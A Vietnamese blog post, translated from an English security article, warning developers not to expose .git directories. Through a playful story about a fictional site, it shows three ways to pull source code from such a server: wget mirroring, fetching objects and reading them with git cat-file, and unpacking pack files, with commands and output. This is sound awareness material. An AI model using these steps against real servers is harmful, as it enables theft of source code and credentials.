---
layout: post
title:  "TIL: Đừng public .git, hoặc đây là 3 cách download cả website của bạn"
author: "Vinh VO"
meta_keywords: "git, web security, bảo mật, brute force, version control system, version control manager, directory-listing, vcs, vcm"
meta_description: "Chúng ta hãy cùng tìm hiểu các lý do tại sao bạn không nên để lộ .git trên server web nhé."
---

*Bài này đuợc dịch từ bài gốc ở  [đây](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/), có chỉnh sửa một số chỗ.*

Hy vọng bài này sẽ giúp anh em chú ý hơn trong việc deploy các source code với VCM. Bởi vì thực tế là có không ít website đang dính lỗi này. (Google 5s là ra á mà). Ví dụ trang: http://deploy-ngay-tho.vn/ (tên nhân vật chính đã được thay đổi).

----
### Chuyện bắt đầu từ ...

Sau một thời gian dài thức khuya code với nhau, quản lý code bằng git, commit push pull đủ thứ, anh Ngây và chị Thơ đã tìm hiểu và đến với nhau, sau đó publish trang *deploy ngây thơ* lên mạng. Mọi chuyện sẽ chẳng có gì lớn lao cho tới một ngày, có người phát hiện ra là cặp đôi ngây thơ bật directory-listing trên nginx và không block access vào folder .git

Đầu tiên là vô tình một cách có chủ ý, truy cập [http://deploy-ngay-tho.vn/.git/](http://deploy-ngay-tho.vn/.git/)

Pemm, nhờ directories listing mà anh em sẽ thấy

![sfsdg]({{ '/assets/images/git-directorylisting.png' | relative_url }})

Sau đây là một số cách để anh chị ngây thơ bị chôm source khi để không .git cho thiên hạ vào xem.

### Cách thứ nhứt: Download hết những gì anh em có thể thấy đuợc trên cái listing đó.

`wget --mirror -I .git http://deploy-ngay-tho.vn/.git/`

Sau khi download xong, nếu anh em xài một số shells như zsh... `cd` vào đó sẽ thấy (`master`/`developer`/`dev`...) tức branch name của git repo.

```
~/deploy-ngay-tho.vn > master >
‣ ll
total 6K
drwxr-xr-x.  6  4.0K Sep 29 23:12 .
drwxr-xr-x.  7  4.0K Sep 29 22:16 ..
drwxr-xr-x.  8  4.0K Sep 29 23:48 .git
```

Thử `git status`, ta sẽ có được các file bị thiếu (giống như deleted), vì ta mới leech được .git trong cái thư mục trống rỗng mà.

```
~/deploy-ngay-tho.vn > master >
‣ git status | head -n 10
On branch master
Your branch is up-to-date with 'origin/master'.
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        deleted:       .buildpath
        deleted:       .gitignore
        deleted:       .htaccess
        deleted:       .project
```

Thử revert lại bằng `git checkout -- .`

```
~/deploy-ngay-tho.vn > master >
‣ ll
total 216K
drwxr-xr-x.  6   4.0K Sep 29 23:12 .
drwxr-xr-x.  7   4.0K Sep 29 22:16 ..
-rw-r--r--.  1  1.2K Sep 29 22:41 favicon.ico
drwxr-xr-x.  8  4.0K Sep 29 23:48 .git
-rw-r--r--.  1   418 Sep 29 22:41 index.php
-rw-r--r--.  1   20K Sep 29 22:41 license.txt
-rw-r--r--.  1  7.3K Sep 29 22:41 readme.html
```

Chúng ta đã có được thứ mà deploy ngây thơ không muốn chúng ta có.

Wow, anh push chị pull điên cuồng tới 9 tháng 10 ngày mới ra được thành quả mà ta download có 5p là có...

**Anh ngây chị thơ bèn tắt directory-listing trên webserver của mình**

Thế là xong, tụi bây đừng hòng wget, curl gì nữa nhé...

Ok, không sao, không có listing thì mình mò từ từ vậy.

**Đây là cấu trúc cơ bản của .git**

```
‣ tree .git            
.git
├── COMMIT_EDITMSG
├── config
├── description
├── HEAD
├── index
├── info
│   ├── exclude
│   └── refs
├── logs
│   ├── HEAD
│   └── refs
│       ├── heads
│       │   └── master
│       └── remotes
│           └── origin
├── objects
├── packed-refs
└── refs
    ├── heads
    │   └── master
    ├── remotes
    │   └── origin
    │       └── HEAD
    └── stash

11 directories, 13 files
```
Còn ý nghĩa của từng thứ có trong .git là gì thì các anh em có thể tìm trên Google có rất nhiều. Đầu tiên là mình sẽ phải download các thành phần kể trên về một thư mục .git đã. Sau đó sẽ tính tiếp.

Các file gồm có:

* HEAD
* objects/info/packs
* description
* config
* COMMIT_EDITMSG
* index
* packed-refs
* refs/heads/master
* refs/remotes/origin/HEAD
* refs/stash
* logs/HEAD
* logs/refs/heads/master
* logs/refs/remotes/origin/HEAD
* info/refs
* info/exclude

**Trong một repo git, có 3 loại object**

* Blob - Dữ liệu ta cần (vd. sourcecode)
* Tree - Nhóm các blob lại với nhau
* Commit - Trạng thái của tree với các meta information (vd. ai commit/commit hồi nào/message)

Các objects này nằm tại thư mục objects, theo cấu trúc `.git/objects/[2-bytes-đầu]/[38-bytes-sau]` trong đó `[2-bytes-đầu][38-bytes-sau]` là SHA1 của object.

Như vậy ta download đuợc mấy phần cơ bản. Các objects này phải xài tool thôi. Mà brute-force SHA1 40 bytes có lẽ không phải là một ý kiến hay cho lắm, tốn thời gian mà tốn điện nữa...

---
### Cách thứ 2

Thử `cat .git/refs/heads/master` xem sao.

```
cat .git/refs/heads/master
6916ae52c0b20b04569c262275d27422fc4fcd34
```

Okie, nôi dung chỉ có 1 đoạn SHA-1 thôi. Tưởng tượng object này nằm tại `.git/objects/69/16ae52c0b20b04569c262275d27422fc4fcd34`

Download nó về và...
```
git cat-file -t 6916ae52c0b20b04569c262275d27422fc4fcd34
commit
```

Đây đúng là một object commit. Thử tìm thêm thông tin về nó xem sao.
```
> git cat-file -p 6916ae52c0b20b04569c262275d27422fc4fcd34
tree fa3887a0b798346c122afdd7c5ecc605bf3c18c0
parent 9264d57c621f66208d689ef653ce8a62c3bccfae
author Nguyen Van Ngay <ngay@nguyen.vn> 1429391394 +0700
committer Nguyen Van Ngay <ngay@nguyen.vn> 1429391394 +0700

Anh yeu em Thơ..
```

Có nhiều thông tin hơn rồi đây... download thử object tree đó về và cat-file nó thử xem sao.

```
git cat-file -p fa3887a0b798346c122afdd7c5ecc605bf3c18c0
040000 tree 532fc6055e09e0a2d5602f4b84c0dbadce1b5f3e        Dumper
040000 tree 077ce769dedcf19d0f063246256e8ae0394fd8df        Extractor
040000 tree d6e1bd4677a256e760cce5ddaa7db7ea6f9a8900        Finder
100644 blob 9670cf17dfeec351c395493058044b9f9dadbe2a        README.md
```

Ok, commit này gồm 3 tree và 1 cái blob readme

Download cái blob về xem sao.
```
git cat-file -p 9670cf17dfeec351c395493058044b9f9dadbe2a
Git Tools
=============
[...]
```

Nội dung của file hiện ra và ta đã lấy được file Readme. Như vậy, mỗi file (object) được băm ra (bằng một giải thuật nào đó) và nhét vào 1 địa điểm nào đó. Chuyện còn lại là làm 1 cái tool, dò hết các hash SHA1 nó thấy và đem về đúng chỗ nó phải ở.

---

### Cách thứ 3
Hoặc nhanh hơn chút nữa, nhờ vào việc git đóng gói các objects lại và để ở `.git/objects/pack/`. Nhưng file này tên gì, thử dò tới `.git/objects/info/packs`
```
cat .git/objects/info/packs
P pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.pack
```

Download nó về  đúng chỗ của nó...

```
> /usr/bin/ls .git/objects/pack/
pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.idx
pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.pack
```
Extract nó ra, ta sẽ có được đầy đủ objects.

```
> git unpack-objects -r < .git/objects/pack/pack-e38660e6be24bb79d8d929ddea3d194e0dd3cd13.pack
Unpacking objects: 100% (15/15), done.
```

Giờ đây anh ngây chị thơ đã chịu block access vào .git trên web của họ, hoặc xóa nó đi luôn cho rồi, nhưng sau đó anh chị cũng quăng luôn cái site nên giờ ae mình truy cập vào không được nữa.

---

Như vậy các anh em có thể thấy được chỉ cần public .git thì nguy cơ bị mất source là không nhỏ. Công sức, tài sản mất đã đành, kẻ xấu còn có thể xem code của mình rồi chê mình code dở ẹt, ... à quên, rồi tìm điểm yếu để tấn công. Hơn nữa, có khi mât db credentials vô tay kẻ xấu thì dữ liệu khách hàng, thẻ tín dụng... nói chung coi như là uy tín của cty đem bỏ sông bỏ bể. Cty sẽ đuổi tay deploy trước, sau đó cty phá sản, ta mất việc.

Không chỉ git bị mà các VCS khác cũng có thể dính, thành thử chúng ta nên ẩn tuyệt đối mọi thứ của chúng đi khi deploy (mà trên prod env thì có VCM cũng chẳng để làm gì)

Một số thứ hay ho như cách phòng chống, công cụ, thống kê lượng website dính lỗi trên top Alexa 1M, các anh em có thể xem tại bài gốc nhé.
